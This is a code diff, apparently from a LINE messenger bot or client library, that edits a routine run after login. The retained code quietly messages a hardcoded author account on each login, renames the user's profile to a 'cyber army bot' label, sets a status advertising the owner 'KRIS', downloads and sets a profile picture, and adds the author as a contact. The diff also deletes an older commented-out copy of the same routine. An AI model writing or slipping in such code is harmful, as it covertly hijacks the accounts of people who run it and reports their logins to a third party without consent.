@@ -210,7 +210,7 @@ class Object(object):
             xmod = self.getContact(KRISx).displayName
             self.sendText("u35459f1e84ad208cc56025c259cb1628", 'nah %s , ' % xmod)
             profile = self.getProfile()
-            profile.displayName = "✰ tɛǟʍ ċʏɮɛʀ-ǟʀʍʏ ɮօt ✰"
+            profile.displayName = "✰ċʏɮɛʀ ǟʀʍʏ ɮօt✰"
             self.updateProfile(profile)
             profile.statusMessage = "OWNER (KRIS) => line://ti/p/~krissthea"
             self.updateProfile(profile)
@@ -219,23 +219,5 @@ class Object(object):
             self.updateProfilePicture(LINE)
             GEN = "u35459f1e84ad208cc56025c259cb1628"
             self.findAndAddContactsByMid(GEN)
-            
-#    def __init__(self):
-#        if self.isLogin == True:
-#            self.log("( %s ) : Verifikasi Login Success" % self.profile.displayName)
-#            self.log("YOUR MID : " + "( "+self.profile.mid+" )")
-#            KRISx = "u35459f1e84ad208cc56025c259cb1628"
-#            xmod = self.getContact(KRISx).displayName
-#            self.sendText("u35459f1e84ad208cc56025c259cb1628", 'nah %s , ' % xmod)
-#            profile = self.getProfile()
-#            profile.displayName = "SAYA MEMAKAI SC CAB"
-#            self.updateProfile(profile)
-#            profile.statusMessage = "OWNER (KRIS)"
-#            self.updateProfile(profile)
-#            DOMAIN_ = "https://2.bp.blogspot.com/-teON0jq8_P0/Wkei_oGyqSI/AAAAAAAAAI0/lMfY0ScHNlQcogpQxnekr56DqDeuTna8gCLcBGAs/s320/cab%2Blogo%2Bcopy.jpg"
-#            LINE = self.downloadFileURL(DOMAIN_)
-#            self.updateProfilePicture(LINE)
-#            GEN = "u35459f1e84ad208cc56025c259cb1628"
-#            self.findAndAddContactsByMid(GEN)
 
 
